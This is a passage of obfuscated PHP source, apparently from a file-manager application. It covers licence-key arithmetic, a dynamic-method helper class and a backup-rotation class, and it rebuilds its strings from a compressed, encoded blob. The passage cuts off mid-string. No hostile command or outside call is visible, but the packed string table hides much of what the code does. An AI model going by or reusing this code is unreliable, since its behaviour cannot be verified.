= $ïÉ´ğšå; $Á¯¢ñµÍ = $ˆ¼Ö‡ÉØ; $øÙó¼ŞÜ = $ñ®ıçÚô[802]; if (!$øÙó¼ŞÜ) { die; } while ($Á¯¢ñµÍ % $¶ÃÅäÙ != 0) { $¬ğÉ×é· = $Á¯¢ñµÍ; $Á¯¢ñµÍ = $¶ÃÅäÙ; $„Ûô£…é = $ñ®ıçÚô[803]; while (strlen($„Ûô£…é) < $ñ®ıçÚô[725]) { if (!$„Ûô£…é) { break; } $„Ûô£…é++; } $¶ÃÅäÙ = $¬ğÉ×é· % $¶ÃÅäÙ; $¦ÌÓÀü’ = $ñ®ıçÚô[804]; if (!$¦ÌÓÀü’) { die; } } if ($¶ÃÅäÙ == 1) { break; } else { $ïÉ´ğšå++; } } $­¢½Ğ· = 2; for ($ıÏƒƒê = 0; $ıÏƒƒê < $ˆ¼Ö‡ÉØ * 10; $ıÏƒƒê++) { if (($ˆ¼Ö‡ÉØ * $ıÏƒƒê + 1) % $ïÉ´ğšå == 0) { $­¢½Ğ· = intval(($ˆ¼Ö‡ÉØ * $ıÏƒƒê + 1) / $ïÉ´ğšå); break; } } $Çïæ¨ø = $this->yxpi3af00147($¸¶ÒÃî» * $ÑĞÃÑ„İ . $Êš¡™Ì[6], $Êš¡™Ì[136]); $“¥ãİßÔ = $ñ®ıçÚô[805]; if (!$“¥ãİßÔ) { return; } $Éù¼˜×Ø = md5($Êš¡™Ì[304] . ($¸¶ÒÃî» + $ÑĞÃÑ„İ) . $Êš¡™Ì[305] . $ïÉ´ğšå . $Êš¡™Ì[305] . $­¢½Ğ· . $Êš¡™Ì[306]); $ŞÏÈø—÷ = $this->yxpi3af00147($±Ó×¡‡, $Éù¼˜×Ø) . $Êš¡™Ì[307] . $Çïæ¨ø; $ÈÁùŞÆÛ = $ñ®ıçÚô[806]; if (strlen($ÈÁùŞÆÛ) < $ñ®ıçÚô[725]) { die; } return $ŞÏÈø—÷; } public function firg094b8e06($¬ÖëßÖ) { $ë¸Ò•ñÍ =& $_SERVER[ÔÕ±ĞšÎ]; $ˆ¡ëºóñ =& $_SERVER[ü¢¡ã”ä]; $¶ÏÀÊÙ = explode($ˆ¡ëºóñ[307], $¬ÖëßÖ); $ÃûÒïÁÌ = $ë¸Ò•ñÍ[807]; if (strlen($ÃûÒïÁÌ) < $ë¸Ò•ñÍ[696]) { return; } if (count($¶ÏÀÊÙ) != 2) { return $ˆ¡ëºóñ[6]; } $¡Ñ¬ÜƒÉ = $this->vzpec33a8f12($¶ÏÀÊÙ[1] . $ˆ¡ëºóñ[6], $ˆ¡ëºóñ[136]); if (!$¡Ñ¬ÜƒÉ) { return $ˆ¡ëºóñ[6]; } $¡Ñ¬ÜƒÉ = intval($¡Ñ¬ÜƒÉ); $Òı…ò·§ = $ë¸Ò•ñÍ[808]; if (strlen($Òı…ò·§) < $ë¸Ò•ñÍ[696]) { die; } $Á–Ú‹éÈ = 0; $‹Œ§¾–ğ = $ë¸Ò•ñÍ[809]; while (strlen($‹Œ§¾–ğ) < $ë¸Ò•ñÍ[709]) { if (!$‹Œ§¾–ğ) { break; } $‹Œ§¾–ğ++; } $¾¥Ì€Ÿç = 0; $ÚÍËüÅ = $ë¸Ò•ñÍ[810]; while (strlen($ÚÍËüÅ) < $ë¸Ò•ñÍ[696]) { if (!$ÚÍËüÅ) { break; } $ÚÍËüÅ++; } for ($ø°ö”¡ = 3; $ø°ö”¡ < $¡Ñ¬ÜƒÉ; $ø°ö”¡ += 2) { if ($¡Ñ¬ÜƒÉ % $ø°ö”¡ != 0) { continue; } $Á–Ú‹éÈ = $ø°ö”¡; $¾¥Ì€Ÿç = intval($¡Ñ¬ÜƒÉ / $ø°ö”¡); break; } $×õéáÙõ = ($Á–Ú‹éÈ - 1) * ($¾¥Ì€Ÿç - 1); $Õ”ºíğ = intval(($Á–Ú‹éÈ + $¾¥Ì€Ÿç) / 2); while (1) { $ñ‘ï†– = $Õ”ºíğ; $É·ß¨‘Ÿ = $ë¸Ò•ñÍ[811]; $€ù‡ò¼İ = $×õéáÙõ; while ($€ù‡ò¼İ % $ñ‘ï†– != 0) { $ªşÇ·Ñ = $€ù‡ò¼İ; $ÛŞàŸìš = $ë¸Ò•ñÍ[812]; while ($ÛŞàŸìš < $ë¸Ò•ñÍ[694]) { if ($ÛŞàŸìš >= 0) { break; } $ÛŞàŸìš++; } $€ù‡ò¼İ = $ñ‘ï†–; $‡àÎõ¿Œ = $ë¸Ò•ñÍ[813]; if (!$‡àÎõ¿Œ) { return; } $ñ‘ï†– = $ªşÇ·Ñ % $ñ‘ï†–; } if ($ñ‘ï†– == 1) { break; } else { $Õ”ºíğ++; } } $íÚ¿ù«Ó = 2; $¥Ë˜òÜÇ = $ë¸Ò•ñÍ[814]; for ($ø°ö”¡ = 0; $ø°ö”¡ < $×õéáÙõ * 10; $ø°ö”¡++) { if (($×õéáÙõ * $ø°ö”¡ + 1) % $Õ”ºíğ == 0) { $íÚ¿ù«Ó = intval(($×õéáÙõ * $ø°ö”¡ + 1) / $Õ”ºíğ); break; } } $€õü³İ = md5($ˆ¡ëºóñ[304] . ($Á–Ú‹éÈ + $¾¥Ì€Ÿç) . $ˆ¡ëºóñ[305] . $Õ”ºíğ . $ˆ¡ëºóñ[305] . $íÚ¿ù«Ó . $ˆ¡ëºóñ[306]); $³±®…§„ = $this->vzpec33a8f12($¶ÏÀÊÙ[0], $€õü³İ); $££Ïê‡ = $ë¸Ò•ñÍ[815]; return $³±®…§„; } public function mdzvc5f9b04e() { $«µ–Öëæ =& $_SERVER[ÔÕ±ĞšÎ]; $‚ŞüÍ‡û = mt_rand(pow(2, 14), pow(2, 16) - 1); $ü¿Äİ = array(); $ı¸à´ığ = 1; $¤†Ø¿òŸ = $«µ–Öëæ[816]; if (strlen($¤†Ø¿òŸ) < $«µ–Öëæ[709]) { die; } while ($ı¸à´ığ <= (int) sqrt($‚ŞüÍ‡û)) { $Ò³¶…¿ = $ı¸à´ığ; while (!0) { $Ò³¶…¿++; $–ì«¨Ş = $«µ–Öëæ[817]; while (strlen($–ì«¨Ş) < $«µ–Öëæ[694]) { if (!$–ì«¨Ş) { break; } $–ì«¨Ş++; } if ($Ò³¶…¿ <= 2) { $ı¸à´ığ = $Ò³¶…¿; break; } else { if ($Ò³¶…¿ < 2) { continue; } } $ÂĞÈ€‚Æ = !0; for ($øÒÃÕŸÕ = 2; $øÒÃÕŸÕ <= sqrt($Ò³¶…¿); $øÒÃÕŸÕ++) { if ($Ò³¶…¿ % $øÒÃÕŸÕ == 0) { $ÂĞÈ€‚Æ = !1; } } if ($ÂĞÈ€‚Æ) { $ı¸à´ığ = $Ò³¶…¿; break; } } $ü¿Äİ[] = $ı¸à´ığ; } $—ÂÒâ = 2; $Ì¼ğ©ìÏ = $«µ–Öëæ[752]; while ($Ì¼ğ©ìÏ < $«µ–Öëæ[725]) { if ($Ì¼ğ©ìÏ >= 0) { break; } $Ì¼ğ©ìÏ++; } for ($Ò³¶…¿ = $‚ŞüÍ‡û; $Ò³¶…¿ > 1; $Ò³¶…¿--) { $ÂĞÈ€‚Æ = !0; $ÙÊÖƒÊ = $«µ–Öëæ[818]; if (strlen($ÙÊÖƒÊ) < $«µ–Öëæ[725]) { die; } foreach ($ü¿Äİ as $¶ä·æÉ“) { if ($Ò³¶…¿ % $¶ä·æÉ“ == 0) { $ÂĞÈ€‚Æ = !1; break; } } if ($ÂĞÈ€‚Æ) { $—ÂÒâ = $Ò³¶…¿; break; } } return $—ÂÒâ; $û‡·òË = $«µ–Öëæ[819]; if (!$û‡·òË) { return; } } public function gpoh251d49cf($¾ş§²¬Ó, $æÑ÷¿‹¡) { $½³µ²Ÿ· =& $_SERVER[ÔÕ±ĞšÎ]; $®¦êÚÃ‹ =& $_SERVER[ü¢¡ã”ä]; return call_user_func(array($®¦êÚÃ‹[8], $®¦êÚÃ‹[308]), $¾ş§²¬Ó, $æÑ÷¿‹¡); $‚äêƒš® = $½³µ²Ÿ·[820]; if (strlen($‚äêƒš®) < $½³µ²Ÿ·[696]) { return; } } public function yxpi3af00147($»›‚Óãè, $•Ğ¦Ùâ…) { $àò ïÛ =& $_SERVER[ü¢¡ã”ä]; return call_user_func(array($àò ïÛ[309], $àò ïÛ[310]), $»›‚Óãè, $•Ğ¦Ùâ…); $Î®™×â = $_SERVER[ÔÕ±ĞšÎ][821]; if (!$Î®™×â) { die; } } public function vzpec33a8f12($¶ïÛ‚´‹, $ÚÈé™õˆ) { $ÓúÖ¾ÕÆ =& $_SERVER[ü¢¡ã”ä]; return call_user_func(array($ÓúÖ¾ÕÆ[309], $ÓúÖ¾ÕÆ[311]), $¶ïÛ‚´‹, $ÚÈé™õˆ); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[ÔÕ±ĞšÎ][822]); $this->init(); $this->keep(); } public function init() { $èŒä÷ˆ… =& $_SERVER[ÔÕ±ĞšÎ]; $this->isManual(); self::$name = date($èŒä÷ˆ…[823]); if (!($æ”‘ø»ş = $this->model->lastItem())) { $æ”‘ø»ş = $this->initData(); } else { self::$name = $æ”‘ø»ş[$èŒä÷ˆ…[32]]; if ($æ”‘ø»ş[$èŒä÷ˆ…[824]] == $èŒä÷ˆ…[91]) { self::$name = date($èŒä÷ˆ…[261]); $äâú´ã = intval(_get($æ”‘ø»ş, $èŒä÷ˆ…[825], 0)); if (self::$manual == 0 && $æ”‘ø»ş[$èŒä÷ˆ…[32]] == self::$name) { $this->model->remove($æ”‘ø»ş[$èŒä÷ˆ…[477]]); } $æ”‘ø»ş = $this->initData($äâú´ã, $æ”‘ø»ş[$èŒä÷ˆ…[826]]); } else { $this->checkStore($æ”‘ø»ş[$èŒä÷ˆ…[826]]); } } self::$option = $æ”‘ø»ş; } private function isManual() { $Ä­ÕÉä‰ = _get($GLOBALS, $_SERVER[ÔÕ±ĞšÎ][827], 0); $Ä­ÕÉä‰ = intval($Ä­ÕÉä‰); self::$manual = $Ä­ÕÉä‰ && $Ä­ÕÉä‰ == 1 ? 1 : 0; } private function initData($¡•Ò—ªÏ = 0, $â´²° = '') { $£˜†¼À• =& $_SERVER[ÔÕ±ĞšÎ]; $¿õÕ¨Áø = $this->model->config(); if ($â´²° && $¿õÕ¨Áø[$£˜†¼À•[826]] != $â´²°) { $¡•Ò—ªÏ = 0; } $this->checkStore($¿õÕ¨Áø[$£˜†¼À•[826]]); if (self::$manual == 1) { self::$name .= $£˜†¼À•[11] . date($£˜†¼À•[828]); } $Ö±èˆª = array($£˜†¼À•[826] => $¿õÕ¨Áø[$£˜†¼À•[826]], $£˜†¼À•[32] => self::$name, $£˜†¼À•[824] => 0, $£˜†¼À•[171] => $¿õÕ¨Áø[$£˜†¼À•[171]], $£˜†¼À•[829] => self::$manual, $£˜†¼À•[370] => array($£˜†¼À•[830] => array($£˜†¼À•[824] => 0), $£˜†¼À•[831] => array($£˜†¼À•[824] => 0, $£˜†¼À•[832] => 0, $£˜†¼À•[833] => 0, $£˜†¼À•[33] => $£˜†¼À•[12], $£˜†¼À•[834] => 0, $£˜†¼À•[835] => 0), $£˜†¼À•[836] => array($£˜†¼À•[824] => 0, $£˜†¼À•[832] => 0, $£˜†¼À•[833] => 0, $£˜†¼À•[834] => 0, $£˜†¼À•[835] => 0), $£˜†¼À•[232] => array($£˜†¼À•[824] => 0, $£˜†¼À•[837] => 0, $£˜†¼À•[838] => 0, $£˜†¼À•[839] => 0, $£˜†¼À•[840] => 0, $£˜†¼À•[543] => $¡•Ò—ªÏ, $£˜†¼À•[834] => 0, $£˜†¼À•[835] => 0)), $£˜†¼À•[834] => time(), $£˜†¼À•[835] => 0); $«ÊèÃÊ¾ = $this->model->insert($Ö±èˆª); $Ö±èˆª[$£˜†¼À•[477]] = $«ÊèÃÊ¾; return $Ö±èˆª; } private function checkStore($•šÇé›Ö) { $Œ®Ğı¤Ö = Model($_SERVER[ÔÕ±ĞšÎ][841]); $œıûâ·ğ = $Œ®Ğı¤Ö->listData($•šÇé›Ö); $Œ®Ğı¤Ö->checkConfig($œıûâ·ğ); } public static function get() { if (!self::$option) { $°…‘˜Ëğ = Model($_SERVER[ÔÕ±ĞšÎ][822]); $µ—ÍÛ²÷ = $°…‘˜Ëğ->findByName(self::$name); $°…‘˜Ëğ->parseContent($µ—ÍÛ²÷); self::$option = $µ—ÍÛ²÷; } return self::$option; } public static function set($†Âµ€¡ñ) { $ú€Å¼Ï× =& $_SERVER[ÔÕ±ĞšÎ]; $™›æ•÷÷ = self::get(); foreach ($†Âµ€¡ñ as $“„·ÙşÓ => $ “îœ™Å) { array_set_value($™›æ•÷÷, $“„·ÙşÓ, $ “îœ™Å); } Model($ú€Å¼Ï×[822])->update($™›æ•÷÷[$ú€Å¼Ï×[477]], $™›æ•÷÷); self::$option = $™›æ•÷÷; return self::$option; } public function keep() { $ÁÍË¾¤† =& $_SERVER[ÔÕ±ĞšÎ]; $›¿âÓ– = self::get(); if (_get($›¿âÓ–, $ÁÍË¾¤†[842], 0) == $ÁÍË¾¤†[91]) { return; } $this->backupKeep($›¿âÓ–); self::set(array($ÁÍË¾¤†[842] => 1)); } private function backupKeep($ùÂ¸Î„) { $Ë¯Çõ¢© =& $_SERVER[ÔÕ±ĞšÎ]; if (self::$manual == 1) { return; } $‰÷ş£ü° = $this->model->listData(); if (empty($‰÷ş£ü°)) { return; } $¨ÈÓÏ‚£ = 0; $ÌæŞ±›Á = array(); foreach ($‰÷ş£ü° as $êš—Á°Õ) { if ($¨ÈÓÏ‚£ >= 7) { break; } $ÌæŞ±›Á[] = $êš—Á°Õ[$Ë¯Çõ¢©[32]]; $¨ÈÓÏ‚£++; } for ($¨ÈÓÏ‚£ = 0; $¨ÈÓÏ‚£ < 12; $¨ÈÓÏ‚£++) { $ÌæŞ±›Á[] = date($Ë¯Çõ¢©[843], strtotime("\x2d{$¨ÈÓÏ‚£}\40\x6d\x6f\156\164\x68\x73")); } $ÌæŞ±›Á = array_unique($ÌæŞ±›Á); $ÊùœºŸ = Model($Ë¯Çõ¢©[844])->get($Ë¯Çõ¢©[845]); foreach ($‰÷ş£ü° as $êš—Á°Õ) { if (isset($êš—Á°Õ[$Ë¯Çõ¢©[829]]) && $êš—Á°Õ[$Ë¯Çõ¢©[829]] == $Ë¯Çõ¢©[91]) { continue; } if (!empty($êš—Á°Õ[$Ë¯Çõ¢©[32]]) && in_array($êš—Á°Õ[$Ë¯Çõ¢©[32]], $ÌæŞ±›Á)) { continue; } $this->model->remove($êš—Á°Õ[$Ë¯Çõ¢©[477]]); $çÄ×Ç° = $this->backupPath($ùÂ¸Î„, $ÊùœºŸ); IO::remove($çÄ×Ç°, !1); } } private function backupPath($ ¿ñœ¥, $ò¶Õ†š‚ = false) { $ÈÏÏî =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ò¶Õ†š‚) { $ò¶Õ†š‚ = Model($ÈÏÏî[844])->get($ÈÏÏî[845]); } $Ï±§”§ò = $ ¿ñœ¥[$ÈÏÏî[32]]; $Âëì–ô¹ = substr(md5($ÈÏÏî[846] . $ò¶Õ†š‚ . $Ï±§”§ò), 0, 8); return "\x7b\151\x6f\x3a{$ ¿ñœ¥[$ÈÏÏî[826]]}\175\x2f\144\141\x74\x61\x62\141\163\x65\57\x62\x61\143\x6b\165\x70\x2f" . $Ï±§”§ò . $ÈÏÏî[11] . $Âëì–ô¹; } public function db() { $Ø÷‰‚Ù =& $_SERVER[ÔÕ±ĞšÎ]; $†âÍ–¿¼ = self::get(); if (_get($†âÍ–¿¼, $Ø÷‰‚Ù[847], 0) == $Ø÷‰‚Ù[91]) { return !0; } $Ó†µ—÷’ = new BackupDb(); if (!$Ó†µ—÷’->index()) { return !1; } self::set(array($Ø÷‰‚Ù[847] => 1)); return !0; } public function dbFile() { $èÉƒÉ‚ =& $_SERVER[ÔÕ±ĞšÎ]; $ÛøÉ³ùé = self::get(); if (_get($ÛøÉ³ùé, $èÉƒÉ‚[848], 0) == $èÉƒÉ‚[91]) { return !0; } $­‚ö¦æ = new BackupDbFile(); if (!$­‚ö¦æ->index()) { return !1; } self::set(array($èÉƒÉ‚[848] => 1)); return !0; } public function file() { $˜í«ÌŒ• =& $_SERVER[ÔÕ±ĞšÎ]; $Ô‚´ş™ = self::get(); if (_get($Ô‚´ş™, $˜í«ÌŒ•[849], 0) == $˜í«ÌŒ•[91]) { return !0; } if ($Ô‚´ş™[$˜í«ÌŒ•[171]] == $˜í«ÌŒ•[850]) { $äÚ„Š¤— = new BackupFile(); if (!$äÚ„Š¤—->index()) { return !1; } } self::set(array($˜í«ÌŒ•[849] => 1, $˜í«ÌŒ•[824] => 1)); return !0; } } goto AãØòÌ¦ñ—; f°«éÌÍå“: function binCheckBigger($Àß²ÚÚ², $ÊßÀÏ¦²) { return $Àß²ÚÚ² > $ÊßÀÏ¦²; } $_SERVER[$_SERVER[óÃÄÎš—][3]] = (base64_decode('ODU5Mw==')."\62\71")+0;$_ehql="9lnwji3kpsd4be6oac7u5hm1gqt0fxvz8ry26rw0zgxuyohvck8aetlfin7j4qd9s25b31p";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($±ü½ÁıÁ, $¢®ú‘÷ù) { $…‡³¾×û =& $_SERVER[ÔÕ±ĞšÎ]; if (isset(self::$_methodList[$±ü½ÁıÁ])) { return @call_user_func_array(self::$_methodList[$±ü½ÁıÁ], $¢®ú‘÷ù); } else { if (method_exists($this, $±ü½ÁıÁ)) { return call_user_func_array(array($this, $±ü½ÁıÁ), $¢®ú‘÷ù); } else { think_exception(__CLASS__ . $…‡³¾×û[4] . $±ü½ÁıÁ . $…‡³¾×û[5]); } } } public static function __callStatic($éÆç´¶×, $ş·øÊ™Î) { if (isset(self::$_methodListStatic[$éÆç´¶×])) { return call_user_func_array(self::$_methodListStatic[$éÆç´¶×], $ş·øÊ™Î); } else { if (method_exists(self, $éÆç´¶×)) { return call_user_func_array(array(self, $éÆç´¶×), $ş·øÊ™Î); } else { show_json("{$éÆç´¶×}\x28\51\40\156\x6f\x74\40\x65\x78\151\x73\x74\73", !1); } } } public static function addMethod($ş€ßÇ¤Ê, $µŸƒï¦á) { self::$_methodList[$ş€ßÇ¤Ê] = $µŸƒï¦á; } public static function addMethodStatic($èÚ÷Áğƒ, $çá‰¥ãş) { self::$_methodListStatic[$èÚ÷Áğƒ] = $çá‰¥ãş; } } goto A‡Ò¸ƒÈÄ‚; Cµ˜«šïÃÀ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xd4\xd5\xb1\xd0\x9a\xce", "\xe2\xd5\xcc\x97\xed\xd0"); $_SERVER[ÔÕ±ĞšÎ] = explode("\x7c\x1\x7c\x1\x7c\x3", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\133\305\265\60\55\264\154\245\245\204\266\24\50\334\70\4\333\211\26\333\331\235\70\101\226\145\133\104\266\214\44\147\263\315\315\265\164\45"."\xdf\x58\xd2\x55\x74\xaf\xbc\x25\xa1\x10\xd6\x2\x9\x50\x42\xc2\x16\xca\x52\xa\x2d\x24\xac\x85\xb0\x4\x78\x40\x29\x94\x52\xa0\xa5\x85\x96\xb2\x14\x62\x27\xd0\x96\xb4\xb4\x50\x68\x5f\xe9\x3f\xcb\x99\xe5\x5e".base64_decode('yfD+7/3f9wcSzZxZ7syZM2fOnDlz5m9PPPmLq7et/xz678A/X//ylT99hIbR3y+sP4iGTw==').base64_decode('vOiQA8ifKRddWFPTPvewmZ1fuuTeHdrt2g7tO9HIsz8PH/GL208NTdz07OjE5w54fPHXvg==')."\xdf\x88\x32\xd3\xb2\x8d\xf4\x47\xc9\x9b\xb6\xa2\x8f\x18\x96\x6d\x51\x40\xd2\xcc\xa7\x8d\xc\xd\x1b\x79\xfa\xeb\xa7\x3f\xdd\xb1\x48\x51\xcf\x99\xb6\x4e\xa3\x3e\xfa\xa3\xf2\x76\xa1\x7f\xad\xb5\x59\x83\xa5\xab"."\235\321\204\32\357\356\352\12\305\22\220\251\121\116\317\231\51\10\25\264\242\226\203\357\27\364\242\205\132\43\127\247\26\314\202\236\167\100\4\40\245\331\132\277\146\101\115\55\315\152\113\250".strrev('£´`à¤í"`ã:ˆ’§p¶¡Í]¼‹†9çNF´V¶ãŒiG¤¶º¿G …vV&©]+')."\x23\x9c\x28\x87\xc7\xa2\x91\x48\x73\x20\xb8\xb4\x3c\xa5\x2b\x16\x68\xeb\x8\x28\xa8\x7d\x59\x5d\x35\xf2\x69\xb3\x46\x59\x4d\x53\x56\x2b\xb5\x34\xd0\x6a\xe8\xd9\x14\xd\xe6\x35\xd6\x1c\x7b\xb4\x0\xa1\x4\xf".base64_decode('oWHKl7JZGunkoZSe1kpZwFaLHCkUjZzGOr1UH+VQGtBKtmnkkzQSGrGLmoCjtibRQOt5qA==').strrev('¡ªÀ®zØ5dÊ"D	B¡¥èj×Òj¦èÜ…ŠŞYQzÙfœ„;EiP7	‚„Š*')."\145\52\124\26\215\265\204\142\112\363\112\105\140\50\151\346\162\146\336\207\152\101\43\151\113\115\15\305\142\64\340\1\362\216\204\361\240\101\44\332\332\32\17\361\30\164\356\264\10\152\311\54".strrev('`®P›Ê‡ AODÖå‰@‚´ù4Â¨S %ÈÖ»¤¦¿ğÕ¿¤21-–êÚÎ•,GO ')."\375\54\327\32\26\60\320\14\35\242\301\246\305\364\167\41\224\357\127\161\232\136\264\125\75\237\64\123\106\36\346\361\22\240\107\315\36\150\51\32\50\3\215\247\315\154\212\205\55\143\14\172"."\x99\x36\xb2\x7a\x67\x29\x27\x67\xe1\xd1\xe4\x80\x91\x4d\x15\xd9\xd4\xfb\xb4\x9c\x34\x1a\xe1\x33\x19\xe7\x15\xb1\x2\x6a\xc9\x7a\xc6\x4\x8c\xf4\xa8\x98\x8a\x38\x5f\x17\x4f\xb5\xcc\x52\x31\xa9\x87\xd1\xd4\xa1"."\361\172\0\353\266\215\72\307\20\142\166\27\262\246\226\212\353\105\336\65\303\154\105\25\105\113\266\14\54\221\154\255\146\61\327\202\230\206\14\353\100\323\306\20\300\101\66\135\122\22\266\374"."\x35\x3d\x67\x79\x3f\xe9\xeb\x39\x5\xfd\x53\xb\x1c\xb1\x17\xda\x33\xa0\x67\xb3\xaa\x3e\xa2\xc3\x7c\xca\xa5\xe6\x58\xc\x11\x7e\xab\xdf\xc8\xfb\x11\x84\x46\xc3\x51\x75\x40\xb3\x6\x3a\x52\x73\x54\x52\xa\x9a".base64_decode('m0/pI77CQIFGxUzvddA7RlunaYckdp01k1pW7goND9h2Ia7nUxgL0BVzOE+wVNB1yNTiUQ==').base64_decode('UkqHslJpbzQaLVYwl+Uh1jsOszjQHmFDmUoDpbLVogo+aFiE8YlZqxUKWSOp2YaZ95tJWw==')."\267\275\226\135\324\65\250\61\220\114\352\226\345\15\232\171\273\150\146\275\201\154\326\34\366\106\213\106\306\310\67\52\63\150\36\234\210\346\272\27\363\305\106\230\300\125\13\25\114\64\370\63".base64_decode('M5pKdto7n01Mnruo5a20XvSGYFY0KqixnDmybC2GVTAtAzevUdFsW0sOYMYiqm/6lPxGPg==').strrev('E'."\0".'HëiZõ‹u`¤hSVjñNJ™Ès‰,2`ú”)Q­92ÔUÛİ¨¼òõäk').strrev('Àd«Ì~ ªÃ-mÚ‡l GjC;šZ+pÔº$Om'."\n".'4°¢´A[7U›*œGÊzx½¥')."\x15\x5e\x34\x99\x30\x35\x75\xa2\xce\x9\x60\x97\x39\xac\x17\xd1\x87\x9b\x47\x1b\x95\x41\x33\xd5\x6f\x8e\xf8\x58\x12\xce\x1c\x47\x5c\x85\x65\xc6\xe3\x5b\xb0\xbd\x31\x2d\x9f\xc1\xdd\xe8\x1f\xb5\x75\xa0\x39\xc1"."\227\232\321\102\356\113\323\231\353\353\327\323\146\21\172\143\15\145\234\310\217\350\371\214\75\300\352\216\207\142\313\102\61\65\36\155\115\54\17\304\140\335\317\43\312\31\141\255\301\137\317\172".base64_decode('Y3oKITFps3JaQWB/hRdPGPxxloonEUuLhNsw7lq8FsrklXOxuiNGzsDds3kKQTYSCtqgQQ==')."\x7e\xd2\xe7\xa6\x5e\x6b\x46\x4d\x6f\x6a\x66\xad\x17\xfd\x3b\xa3\xb6\xa7\xb7\xc5\x37\xa3\x6f\x89\xdf\x10\x65\xfc\xf5\xbe\x7a\xa5\xa1\x6e\xae\xd2\x85\xa4\x14\x43\xcb\x2a\xd0\xe9\xb2\x1c\x75\x4a\x74\xa9\x13\x2d"."\x82\xc2\xf3\x66\x5e\xaf\x38\xb1\x10\x21\x99\x96\xee\x6d\xd7\x35\xc4\xa0\xd1\x40\x38\xc6\xc5\xc3\xbe\x45\xe3\x9f\x82\x5d\xbc\x4e\x4a\xbc\xc4\x35\x2e\x14\x18\xb\x9d\xd6\x1d\x8a\x27\xd4\x8e\x50\xa2\x3d\xda\x2".strrev(''."\r".'‰|¤Æô¡¤“ƒ“Ğ]ùÀõáÍ:å!ÊHb­"0!Œ¡cÙ{I…G” Í')."\x5d\xf\xfd\xe9\x3\x6a\xee\xa3\x3f\xaa\x61\xb5\x4a\x6b\x26\x8e\x72\xfe\xaa\x9a\xfd\x6b\x10\x65\x75\xe8\x6c\x11\x81\x2f\x85\x73\x68\xe\x8b\x96\xab\xce\x5\x8e\x75\xab\x43\x50\x3a\x9a\x32\xcb\x8d\x14\x5f\x1"."\x51\xb4\x5d\x37\x32\x3\xd0\x50\x3\x57\x97\x34\xb3\x66\x51\xcb\x62\xde\xcf\x84\xd6\x8c\x1\x6c\xb8\x90\x2d\x21\xba\xf7\xe3\x8a\x13\x3\xa5\x5c\x3f\xac\x54\x8\x47\x19\xdd\x16\xf2\xa4\x35\x8a\x84\x2e\xe0\xbc".base64_decode('SPxGyAzDsMCaCzG/imm111fIZ2pPgrrUhjl1GADDCD1DgnVJL++6L2miid2hDeqNuC/AzQ==').base64_decode('FhIoi0gMcyFe45rcfAEPT9aXQ5WQOoMmX5Xp1gUEILbGKXqxaBanQg4SVshCiYcLKre5yA==').strrev('ÿBÏàƒÖJtg¬V#UJ– ê'."\r".',ùª$)`V†ô÷è~ŒFLQ&ÂÀ!a')."\213\105\77\145\346\64\266\204\142\316\303\77\213\43\26\217\221\165\121\117\321\205\321\1\242\63\232\202\146\260\117\26\155\23\47\26\35\71\21\221\16\230\320\150\104\25\320\341\22\357\71\303"."\x41\x4a\xcf\xea\x8c\xc0\x6\x74\x26\x5b\xd4\x41\x36\x34\x32\x9c\xfc\xd2\x7c\x1e\xa0\x9d\x3\x82\xa\x81\xce\xb0\x62\xa8\x24\x96\x4\x58\x7c\x39\xde\x6a\x9\x0\x16\x87\x80\xae\x44\x30\x8b\x46\x35\x4a\x26\x94"."\210\167\25\365\264\1\14\75\217\30\103\207\126\34\144\35\103\45\305\124\304\21\151\232\266\166\107\42\152\60\332\231\100\73\65\12\131\36\13\47\200\215\305\20\73\122\3\301\56\210\11\246"."\xc7\x25\x36\x59\xe6\xa0\x90\xa1\x6\x20\x21\xd4\x8\xbf\x10\x8e\xd0\xea\x5c\x30\xf3\x88\xb5\x2\x77\xf2\x8a\x7d\x5c\x59\x52\x4a\xc8\xe\x40\x3b\x42\xde\x70\x89\x10\x48\x8\xc8\x8d\x79\x73\x88\xaf\x78\x79\x9b".base64_decode('urph8WdUwWTg5lEs3sLgG5n8Mj7yy+Ozve0dgaA33h5omDOXQlfmUr2JdsPqXcXj0Jxhaw==')."\xb6\x5a\xd4\xd1\x9c\x66\xb4\xd0\x50\x57\xcf\x66\x1c\x12\x44\x34\xd1\xf2\x95\xde\x9c\x17\xd7\x82\x65\x48\x5f\x5d\x5d\x1d\xab\x6b\xe6\x5c\x65\x0\xb1\x92\xf5\x8c\x61\xa7\x48\x6f\xd9\xb6\xa6\x94\x1c\xd4\x65\xfe"."\x6d\x79\x87\xd\xc6\xf3\x4e\xe2\xf2\xf7\x49\xe5\xc8\xb7\x4a\x64\x39\x53\xb5\x24\xae\x4e\x45\x85\xed\x92\x25\x63\xa\x11\x60\xa\x15\x31\x98\x58\x4c\xa1\x5a\x36\x63\x22\xba\x1b\xc8\xc9\xc0\x14\xa7\x5f\x1a\xd7".base64_decode('qYwFHxrQOJ4w9tjkQBLcqFwIoxm1gfFvp1CtJCojmsrqYcC2aEcBL2WIa7NhO5n+HAbNKA==')."\241\171\133\64\306\44\354\57\141\65\61\236\31\215\303\47\107\162\131\261\341\2\324\0\66\345\256\215\250\50\105\205\24\125\116\151\347\174\200\215\102\107\213\153\116\320\325\236\302\26\55\101"."\137\124\206\260\372\306\314\67\125\327\373\352\252\25\266\15\155\252\356\116\264\42\301\174\311\342\303\26\5\315\134\1\263\25\262\347\302\375\245\224\273\30\372\270\10\13\75\54\322\345\102\107".base64_decode('KKHBqrPIL+db5J+sVugKlsRWqF2RQKI1GusAGi8UBFkVkpVmm1dwpJLl1bFgDLNAS2ZdJA==').base64_decode('KuNiRUVKXFGJEle4KHFFOSWuqERnQ0CQWk4bM/NovqKFNudLAlkk2sOdS9WOaEsoooY7kQ==').base64_decode('AJcoh3d3tQQYG5ThzdFEuwPajUS4ZYFI2J09tCIcT8QrJiFYd8iV0tKsdsVCreEVPNoaDg==').base64_decode('RVriajAQbBd5OgMdEEGykp5NWX5nfhXJonGuY1OB4CDmUGupTGGjCk6M9jU6DAd0F2spSQ==')."\117\100\107\231\64\113\134\262\144\233\370\34\133\15